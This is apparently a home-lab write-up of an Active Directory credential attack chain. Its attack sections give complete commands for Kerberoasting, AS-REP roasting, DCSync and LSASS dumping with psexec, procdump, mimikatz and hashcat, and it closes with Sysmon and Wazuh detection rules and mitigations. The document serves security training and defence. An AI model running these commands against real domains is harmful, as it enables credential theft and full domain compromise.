## Block 1 — Active Directory Credential Attack Chain
*Kerberoasting → AS-REP Roasting → DCSync → LSASS Credential Dumping*

Lab: corpnet.local (isolated VMnet2, 192.168.100.0/24) Environment: DC01 (Domain Controller) · KALI-ATK (attacker) · SENSOR (Suricata) · VICTIM (Metasploitable2) Objective: Enumerate and exploit four distinct Active Directory credential-harvesting vectors, using recon output to justify each attack choice rather than running exploits blindly.

### Overwiev

|Attack|Exploited Property|Precondition Found During Recon|Process Traces|
|---|---|---|---|
|Kerberoasting|SPN (Service Principal Name) on a user account|Account has a registered SPN|Network only|
|AS-REP Roasting|DONT_REQ_PREAUTH flag in userAccountControl|Kerberos pre-authentication disabled|Network only|
|DCSync|DS-Replication-Get-Changes[-All] ACE|Replication rights delegated to a non-DA principal|Network only|
|LSASS Credential Dumping|Interactive/remote local admin session on a host|Attacker already holds local admin (via earlier attack or lateral movement)|Local process activity|

### 1. Recon Phase — No Credentials
#### 1.1 User Enumeration
```bash
# confirm Kerberos is reachable

nmap -p 88 192.168.100.1

kerbrute userenum -d corpnet.local --dc 192.168.100.1 usernames.txt -o valid_users.txt
```

#### 1.2 AS-REP Roasting Check (no creds required)
```bash
impacket-GetNPUsers corpnet.local/ -usersfile valid_users.txt -dc-ip 192.168.100.1 -format hashcat -no-pass -outputfile asrep_hashes.txt

# If a hash is returned, crack offline:

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 2. Recon Phase — With Low-Privilege Credentials
```bash
bloodhound-python -u j.melnyk -p 'P@ssw0rd123' -d corpnet.local -ns 192.168.100.1 -c All
```

Direct LDAP equivalents:

# SPN accounts (Kerberoasting candidates)
```bash
impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
# Replication rights on the domain object (DCSync candidates)
```bash
impacket-dacledit -action read -target-dn "DC=corpnet,DC=local" corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```

### 3. Exploitation
#### 3.1 Kerberoasting
```bash
impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1 \ -request -outputfile kerberoast_hashes.txt

hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```
#### 3.2 AS-REP Roasting
Already executed during recon (Section 3.2) — inherently a single unauthenticated request, no separate exploitation step.
#### 3.3 DCSync
```bash
secretsdump.py corpnet.local/svc-monitor:'Monitor2024!'@192.168.100.1
```
#### 3.4 LSASS Credential Dumping (New — Attack #4)
Precondition check — confirm you actually have local admin before attempting this:
```bash
# From KALI-ATK, using credentials obtained from an earlier step (e.g. cracked Kerberoasting hash)

crackmapexec smb 192.168.100.1 -u svc-sql -p 'CrackedPassword123' --local-auth

# Look for (Pwn3d!) in the output — confirms admin rights on the target
# Confirm who's logged in before dumping, so the attempt isn't wasted:

crackmapexec smb 192.168.100.1 -u svc-sql -p 'CrackedPassword123' --local-auth --loggedon-users
```
##### Step 1 — Remote execution via PsExec-style access (impacket)
```bash
psexec.py corpnet.local/svc-sql:'CrackedPassword123'@192.168.100.1
```
This drops you into an interactive SYSTEM-level shell on DC01 — this is the moment the attack stops being "just network" and starts leaving real host-side artifacts (a new service creation event, a spawned process tree).

##### Step 2 — Dump LSASS memory (two approaches, both leave distinct forensic signatures)

Approach A — via Sysinternals procdump (creates a dump file on disk, safer/quieter than injecting Mimikatz directly into LSASS):
```bash
# On DC01, from the psexec shell

procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```
Approach B — via Mimikatz directly against the live LSASS process (louder, higher-fidelity):
```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
##### Step 3 — Exfiltrate and analyze offline (Approach A)
```bash
# From KALI-ATK

smbclient //192.168.100.1/C$ -U svc-sql

smb: \> get Windows\Temp\lsass.dmp

# Analyze offline with pypykatz (no need to run Mimikatz on the target at all)

pypykatz lsa minidump lsass.dmp
```
What you get: cleartext passwords / NTLM hashes for every account with an active logon session on DC01 at capture time — including, if a Domain Admin has ever logged in interactively, their credentials directly.

### 4. Detection

(Extends Block 2 Suricata rules with host-based Sysmon/Wazuh detection for attack #4, since LSASS dumping produces no distinctive network signature — it's entirely a host-side event.)

Kerberoasting — high volume of TGS-REQ (message type 12) for RC4 encryption (etype 23) from a single host in a short window; modern environments default to AES.

AS-REP Roasting — AS-REQ (message type 10) without the pre-authentication data field is the signature.

DCSync — DRSUAPI (MS-DRSR) IDL_DRSGetNCChanges calls from a source that is not a known Domain Controller.

LSASS Credential Dumping — this is a host-only detection, network monitoring is blind to it. Two signals matter:

Sysmon Event ID 10 (ProcessAccess) — any process opening a handle to lsass.exe with access rights including PROCESS_VM_READ from a non-standard source process (i.e., not a legitimate Windows security component).

<!-- Sysmon config snippet -->
```
<ProcessAccess onmatch="include">

  <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>

  <GrantedAccess condition="is">0x1010</GrantedAccess>

</ProcessAccess>
```
Wazuh custom rule correlating Sysmon Event 10 against lsass.exe:
```
<group name="windows,credential_access,lsass">

  <rule id="100020" level="12">

    <if_group>sysmon_event10</if_group>

    <field name="win.eventdata.targetImage">lsass.exe</field>

    <description>Possible credential dumping: process accessed LSASS memory</description>

    <mitre>

      <id>T1003.001</id>

    </mitre>

  </rule>

</group>
```
Process-name/command-line signature (secondary, easily evaded but useful as a baseline rule): alert on procdump.exe or mimikatz.exe process creation, or command lines containing sekurlsa:: or -ma lsass.


### 5. Mitigation
|Attack|Mitigation|
|---|---|
|Kerberoasting|Long random service-account passwords; gMSA where possible; alert on RC4 TGS requests|
|AS-REP Roasting|Disable DONT_REQ_PREAUTH domain-wide unless explicitly required; audit userAccountControl|
|DCSync|Restrict Get-Changes[-All] to Domain Admins/Domain Controllers only; regular ACL audits|
|LSASS Credential Dumping|Enable Credential Guard (isolates credentials in a VBS-protected container, inaccessible even to SYSTEM); enable LSA Protection (RunAsPPL) so LSASS runs as a Protected Process and rejects unsigned dump attempts; restrict local admin rights via LAPS/tiered administration so compromising one host doesn't yield DA credentials; deploy Sysmon + EDR with Event ID 10 alerting on lsass.exe access|

### 6. Notes / Lessons Learned
- The first three attacks form a chain reachable purely over the network; attack #4 requires a privilege escalation prerequisite (local admin on a target host) — this is why its recon step differs fundamentally: instead of checking an LDAP attribute or ACE, you check AdminTo reachability and active logon sessions.
- LSASS dumping is the only attack in this set that is invisible to Suricata and visible to memory/host forensics — the inverse of the first three. This directly validates the Block 3 finding that network-borne AD attacks leave no process trace, by providing the contrasting case where a real process (procdump.exe/mimikatz.exe) really does show up in volatility3 windows.pslist and Sysmon logs.
Tiered administration (not letting a single credential have local admin everywhere) is the single most effective structural mitigation against attack #4 — it caps the blast radius of any one LSASS dump to whatever that specific host's logged-on sessions expose.

